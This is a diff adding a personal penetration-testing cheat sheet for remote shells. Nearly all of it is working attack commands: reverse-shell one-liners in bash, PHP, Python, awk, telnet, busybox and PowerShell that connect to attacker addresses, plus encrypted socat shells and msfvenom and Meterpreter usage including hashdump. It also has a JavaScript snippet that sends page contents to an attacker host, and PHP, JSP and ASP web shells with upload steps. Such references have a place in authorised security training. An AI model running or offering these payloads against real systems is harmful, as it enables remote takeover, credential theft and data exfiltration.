@@ -1,0 +1,372 @@
+https://github.com/payloadbox/command-injection-payload-list
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+		
+
+
+0.0.0.0: connect from anywhere
+
+netcat (nc)
+
+	listener (for bind/revshell):
+		nc -lvnp (port no)
+		-l: listen mode
+		-v: verbose, see when we receive a connection
+		-n: disable dns resolution, so only ip-s work
+		-p: port number
+		important: ports below 1024 will only work if nc can be run w elevated privileges
+		
+other listeners:
+
+	rlwrap
+		small utility that uses the GNU readline library to provide editing keyboard and history.
+		rlwrap nc -lvnp 443: rlwrap makes it possible to use arrow keys and access history
+		
+	ncat
+		provides extra features like ssl encryption
+		
+	socat - like nc but advanced and is rarely installed by default
+		create a socket connection between two data sources
+		socat -d -d TCP-LISTEN:443 STDOUT
+			-d: verbose
+		windows:
+			socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes - pipes forcing powershell to use unix style stdin/out
+		linux:
+			socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+			socat TCP-L:<port> FILE:`tty`,raw,echo=0     - Specifically, we are passing in the current TTY as a file and setting the echo to be zero. 
+															This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -
+															- with the added bonus of being immediately stable and hooking into a full tty.
+			
+			
+CERT GEN
+
+		for encrypted shells
+		
+		example:
+			openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+				will ask for cert info, can be filled randomly or left blank
+				We then need to merge the two created files into a single .pem file:
+			cat shell.key shell.crt > shell.pem
+				then
+			socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+				verify=0 tells the connection to not validate the cert.
+				to connect back:
+			socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+			socat openssl-listen:53,cert=encrypt.pem,verify=0 file:'tty',raw,echo=0
+			to connect back:
+			socat TCP:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+			
+			
+			
+
+BASH
+
+	one liners for creating shells
+	
+	bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+		>&: combines stderr and out to show in shell
+		-i: interactive
+		
+	exec 5<>/dev/tcp/attacker_ip/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+		creates a new file descriptor (5 here) and connects to a tcp socket.
+		read and execute from there, send output back on the same socket
+
+	Bash With File Descriptor 196 Reverse Shell
+	0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
+	This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection.
+	It allows the shell to read commands from the network and send output back through the same connection.
+
+	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+
+	This creates a named pipe (FIFO) at /tmp/f. A FIFO is a special type of file that behaves like a pipe, allowing data to be written 
+	to it by one process and read by another. It’s useful for creating a communication channel between processes.
+	The -i flag makes sh run in interactive mode, which means it will open a shell that can interact with the user or another program.
+	2>&1: This part redirects standard error (stderr) to standard output (stdout). 
+	This ensures that both normal output and error messages from the shell are combined and passed through the pipe.
+	
+	
+	
+
+PHP
+	php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+		uses exec func to open a shell and redirect stdin and out
+	
+	php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+		Similar to the previous command, but uses the shell_exec function.
+
+	php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
+		This reverse shell employs the system function, which executes the command and outputs the result to the browser.
+	
+	php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+		The passthru function executes a command and sends raw output back to the browser.
+		This is useful when working with binary data.
+
+	php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
+		This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.
+		
+		
+		
+	
+PYTHON     ## subprocess module is responsible for managing shell commands and revshell connections
+	
+	Python Reverse Shell by Exporting Environment Variables
+	export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
+		This reverse shell sets the remote host and port as environment variables, creates a socket connection,
+		and duplicates the socket file descriptor for standard input/output.
+
+	Python Reverse Shell Using the subprocess Module
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
+		This reverse shell uses the subprocess module to spawn a shell and set up a similar environment
+		as the Python Reverse Shell by Exporting Environment Variables command.
+
+	Short Python Reverse Shell
+	python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+		This reverse shell creates a socket (s), connects to the attacker, and redirects standard input,
+		output, and error to the socket using os.dup2().
+		
+		
+			
+	upgrade shell to be able to edit commands and access history:
+	python -c 'import pty; pty.spawn("/bin/bash")'
+	
+	
+
+TELNET
+
+	TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
+		This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 
+	
+
+
+AWK
+
+	awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+		awk has builtin tcp capabilities, connecting to attackerip:port, reads commands from atkr and exec, sending results back after on the same tcp connection
+
+
+BUSYBOX
+	busybox nc ATTACKER_IP 443 -e sh
+		uses nc to connect to atkr then exec /bin/sh for the atkr
+	
+
+WEB SHELLS
+	
+	PHP
+		<?php
+		if (isset($_GET['cmd'])) {
+			system($_GET['cmd']);
+		}
+		?>
+			requires to be saved into file, uploaded to server and the accessed via corresponding url
+			http://victim.com/uploads/shell.php?cmd=whoami
+				where command can be executed after cmd=
+				
+	existing nice webshells for download:
+		https://github.com/flozz/p0wny-shell
+		https://github.com/b374k/b374k
+		https://www.r57shell.net/single.php?id=13
+	more at:
+		https://www.r57shell.net/index.php
+	
+
+
+METASPLOIT -
+
+	MSFVENOM - payload generator
+
+	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=34565 -f raw > revshell.file
+	msfvenom -l payloads
+	msfvenom --list formats  # -f elf/raw/exe/etc
+	generated php will need editing of start and end <?php ?>
+
+
+	METERPRETER - lets get some revshells arrived ere lads
+		most lin commands work here
+		search type:auxiliary telnet
+		search exploit
+		use exploit/multi/handler
+		show options
+		setg - sets parameters for all modules
+		unsetg
+		unset all - if set stuff need fast clear
+		show payloads
+		set payload x
+		unset payload - unset works here as well if needed
+		show modules - need to bg session first if want sg after meterpreter is established and back command
+		load x
+		run
+		meterpreter session start - show sessions - background ctrl+z - sessions -i x
+		getpid
+		getuid
+		hashdump
+		shell - drops a shell on tgt
+		pgrep	ps	pkill
+		migrate
+		sysinfo
+		screenshare
+		screenshot
+		play - plays a .wav file
+		webcam_chat webcam_list wabcam_snap webcam_stream
+		getsystem - getprivs - attempt priv esc
+		
+
+		Network commands:
+			arp - host arp cache display
+			if/ipconfig
+			route - view and modify routing table
+			netstat
+			portfwd
+			resolve
+			
+		File operations:
+			download
+			edit
+			upload
+			rm
+			rmdir
+			getwd
+			lcat
+			mkdir
+			mv
+			rmdir
+			search -f 'file.txt'
+			show_mount
+			del
+			cp
+			cat
+			checksum
+		
+	LOOT:
+		after info gathered - path is ~/.msf4/loot
+		
+		loot -v
+		loot -s 2 - session specific
+		db_loot
+		
+		
+		
+
+
+
+
+
+UPGRADE SHELLS to be able to edit commands and access history etc:
+
+	pytohn:
+		1. python -c 'import pty; pty.spawn("/bin/bash")'
+		2. export TERM=xterm
+		3. ctrl+z			 - drops active revshell to background
+		4. stty raw -echo; fg   - after bg, turn off own terminal echo - so autocomplete and arrows and ctrl+c works in revshell and fg to foreground bg'ed revshell
+
+	rlwrap: - gives us a more interactive shell upon arrival - especially useful against win
+		rlwrap n -lvnp <port>
+		
+
+
+
+	shell size:
+		echo $TERM
+
+		(xterm-256color, current value)
+
+		stty size
+
+		(67 318, current value)
+
+		shell size modify:
+
+		export TERM=xterm-256color
+
+		stty rows 67 columns 318
+
+
+		
+		
+
+WIN:
+		powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',34565);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
+		powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+		Javascript:
+		<script>
+		fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})
+		  .then(response => response.text())
+		  .then(text => { 
+			fetch('http://10.10.10.10:80/' + btoa(text), {mode:'no-cors'}); 
+		  });
+		</script>
+
+
+
+
+		powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]34565; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+
+
+		web shell:
+
+
+		php:
+
+		<?php system($_REQUEST["cmd"]); ?>
+
+		jsp:
+
+		<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+		asp:
+
+		<% eval request("cmd") %>
+
+		uploading:
+
+		find webroot
+
+		Web Server				Default Webroot
+		Apache				/var/www/html/
+		Nginx					/usr/local/nginx/html/
+		IIS					c:\inetpub\wwwroot\
+		XAMPP					C:\xampp\htdocs\
+
+		example on lin apache:
+
+		echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+
+		http://server_ip:port/shell.php?cmd=id
+
+
+		with curl:
+
+		curl http://SERVER_IP:PORT/shell.php?cmd=id
+
+		uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
